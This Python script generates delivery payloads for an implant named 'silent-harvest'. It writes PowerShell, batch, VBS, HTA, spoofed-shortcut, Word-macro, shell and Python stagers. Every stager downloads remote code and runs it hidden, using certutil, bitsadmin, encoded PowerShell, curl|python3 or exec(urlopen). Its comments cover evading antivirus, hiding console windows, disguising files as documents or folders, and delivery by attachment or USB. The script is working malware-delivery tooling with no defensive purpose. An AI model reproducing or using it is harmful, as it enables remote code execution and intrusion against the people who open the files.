#!/usr/bin/env python3
"""make_payload.py -- delivery payload generator for silent-harvest.

Generates first-stage payloads that fetch and execute the implant from a URL
the operator hosts (e.g. `python -m http.server 9000` over build/, or the
linux file over the repo root). All stages are plain text / script formats:
no compilation, no dependencies, every target executes them out of the box.

Formats
  ps1    PowerShell cradle (WebClient download -> hidden run)
  bat    batch stager: certutil download with bitsadmin/powershell fallbacks
  vbs    WScript stager (wscript.exe runs it with no console window)
  hta    HTML application -- mshta executes it, no script-file blocking
  lnk    emits a PowerShell builder that creates an icon-spoofed .lnk whose
         target is the hidden cradle (double-click / USB / zip delivery)
  macro  VBA Document_Open macro to paste into a .docm (Word/Excel)
  sh     POSIX one-liner: curl|python3 for the linux implant
  py     python memory cradle (exec(urlopen), nothing touches disk)

Usage
  python tools/make_payload.py --url http://192.168.0.128:9000/updater.exe \
      --c2 http://192.168.0.128:8443/gate --psk SECRET --auth opstoken \
      --out build/payloads

  python tools/make_payload.py --list     # format catalog + ATT&CK IDs
"""
import argparse
import base64
import os
import sys

FORMATS = (
    ("ps1", "T1059.001", "PowerShell cradle",
     "smallest reliable vector; AV/AMSI see it clearest"),
    ("bat", "T1059.003", "batch stager (certutil/bitsadmin)",
     "survives environments where powershell.exe is blocked"),
    ("vbs", "T1059.005", "WScript stager",
     "double-click execution, no console flash"),
    ("hta", "T1218.005", "mshta HTML application",
     "delivered as a 'document'; bypasses script-file blocking"),
    ("lnk", "T1204.002", "icon-spoofed shortcut (builder)",
     "looks like a folder/PDF; carries the cradle in Arguments"),
    ("macro", "T1566.001", "VBA Document_Open macro",
     "paste into .docm; fires when the doc opens"),
    ("sh", "T1059.004", "POSIX curl|python3 one-liner",
     "linux implant, memory delivery, zero disk artifacts"),
    ("py", "T1059.009", "python exec(urlopen) cradle",
     "any OS with python3; nothing touches disk"),
)


def b64_ps(cmd):
    """UTF-16LE base64, what powershell -EncodedCommand expects."""
    return base64.b64encode(cmd.encode("utf-16-le")).decode()


def ps_collapse(lines):
    return ";".join(ln.strip() for ln in lines if ln.strip())


def ps_download_exec(url, args_str):
    """The core Windows cradle: download to %TEMP%, run hidden."""
    dl = [
        "$u='%s'" % url,
        "$p=Join-Path $env:TEMP ([IO.Path]::GetRandomFileName()"
        ".Replace('.','')+'.exe')",
        "(New-Object Net.WebClient).DownloadFile($u,$p)",
        "Start-Process -WindowStyle Hidden $p %s" %
        ("-ArgumentList %s" % args_str if args_str else ""),
    ]
    return ps_collapse(dl)


def build_all(url, c2, psk, auth, loop, out_dir):
    os.makedirs(out_dir, exist_ok=True)
    args_list = ["--loop", str(loop)]
    if c2:
        args_list += ["--c2", c2]
    if psk:
        args_list += ["--psk", psk]
    if auth:
        args_list += ["--auth", auth]
    # comma-quoted for Start-Process -ArgumentList
    args_ps = ",".join("'%s'" % a for a in args_list)
    # space-joined for shell-style invocations
    args_shell = " ".join(args_list)

    core = ps_download_exec(url, args_ps)
    hidden_ps = "powershell -w hidden -nop -e %s" % b64_ps(core)
    made = {}

    # ---- ps1 (direct cradle)
    made["stager.ps1"] = (
        "# silent-harvest first stage\n"
        "# delivery: attachment, USB, link, or -File from anything\n"
        "%s\n" % core)
    made["stager.ps1.b64cmd"] = b64_ps(core)

    # ---- bat (certutil primary, bitsadmin + powershell fallbacks)
    made["stager.bat"] = (
        "@echo off\r\n"
        "rem silent-harvest first stage (certutil w/ fallbacks)\r\n"
        "set U={url}\r\n"
        "set D=%TEMP%\\%RANDOM%.exe\r\n"
        "certutil -urlcache -split -f %U% %D% >nul 2>&1\r\n"
        "if not exist %D% bitsadmin /transfer sh %U% %D% >nul 2>&1\r\n"
        "if not exist %D% powershell -w hidden -nop -c "
        "\"(New-Object Net.WebClient).DownloadFile('%U%','%D%')\"\r\n"
        "start \"\" /min %D% {args}\r\n").format(url=url, args=args_shell)

    # ---- vbs (wscript: zero console artifacts)
    made["stager.vbs"] = (
        "' silent-harvest first stage (wscript, silent)\n"
        "Set sh = CreateObject(\"WScript.Shell\")\n"
        "sh.Run \"{cmd}\", 0, False\n").format(cmd=hidden_ps)

    # ---- hta (mshta)
    made["stage.hta"] = (
        "<html><head><title>Documents</title></head><body>"
        "<script language=\"VBScript\">"
        "Set sh = CreateObject(\"WScript.Shell\")\n"
        "sh.Run \"{cmd}\", 0, False\n"
        "window.close\n"
        "</script></body></html>").format(cmd=hidden_ps)

    # ---- lnk builder: run once anywhere to emit the icon-spoofed shortcut
    made["make_lnk.ps1"] = (
        "# run: powershell -ExecutionPolicy Bypass -File make_lnk.ps1 "
        "[output.lnk] [icon]\n"
        "param([string]$O='documents.lnk',\n"
        "      [string]$I='%SystemRoot%\\system32\\SHELL32.dll,4')\n"
        "$s=(New-Object -ComObject WScript.Shell).CreateShortcut("
        "(Join-Path (Get-Location) $O))\n"
        "$s.TargetPath='powershell.exe'\n"
        "$s.Arguments='-w hidden -nop -e {b64}'\n"
        "$s.WindowStyle=7\n"
        "$s.IconLocation=$I\n"
        "$s.Save()\n"
        "Write-Host ('wrote '+$O)\n").format(b64=b64_ps(core))

    # ---- macro (paste into ThisDocument of a .docm)
    made["macro.txt"] = (
        "' silent-harvest first stage -- paste into ThisDocument\n"
        "Private Sub Document_Open()\n"
        "    Dim sh As Object\n"
        "    Set sh = CreateObject(\"WScript.Shell\")\n"
        "    sh.Run \"{cmd}\", 0, False\n"
        "End Sub\n").format(cmd=hidden_ps)

    # ---- sh (linux one-liner)
    made["stage.sh"] = (
        "# silent-harvest linux first stage\n"
        "SH_C2='{c2}' SH_PSK='{psk}' SH_AUTH='{auth}' "
        "curl -fsSL {url} | python3 - --loop {loop}\n"
    ).format(c2=c2 or "", psk=psk or "", auth=auth or "",
             url=url, loop=loop)

    # ---- py (memory cradle)
    made["stage.py"] = (
        "# silent-harvest memory cradle\n"
        "import urllib.request, os\n"
        "os.environ.update({{'SH_C2': {c2!r}, 'SH_PSK': {psk!r}, "
        "'SH_AUTH': {auth!r}}})\n"
        "exec(urllib.request.urlopen({url!r}).read())\n"
    ).format(c2=c2 or "", psk=psk or "", auth=auth or "", url=url)

    for name, content in made.items():
        with open(os.path.join(out_dir, name), "w",
                  encoding="utf-8", newline="\n") as f:
            f.write(content)
    return made


def main():
    ap = argparse.ArgumentParser(
        description="silent-harvest delivery payload generator")
    ap.add_argument("--url", required=True,
                    help="URL of the hosted implant (exe or .py)")
    ap.add_argument("--c2", default=None, help="collector gate URL")
    ap.add_argument("--psk", default=None, help="pre-shared key")
    ap.add_argument("--auth", default=None, help="collector --auth token")
    ap.add_argument("--loop", type=int, default=300)
    ap.add_argument("--out", default="build/payloads")
    ap.add_argument("--list", action="store_true")
    a = ap.parse_args()

    if a.list:
        print("%-7s %-11s %-38s %s" % ("format", "ATT&CK", "what", "note"))
        for f, tid, what, note in FORMATS:
            print("%-7s %-11s %-38s %s" % (f, tid, what, note))
        return 0

    made = build_all(a.url, a.c2, a.psk, a.auth, a.loop, a.out)
    print("[+] wrote %d payloads to %s"
          % (len(made), os.path.abspath(a.out)))
    for n in sorted(made):
        print("    %-20s %5d bytes" % (n, len(made[n])))
    return 0


if __name__ == "__main__":
    sys.exit(main())
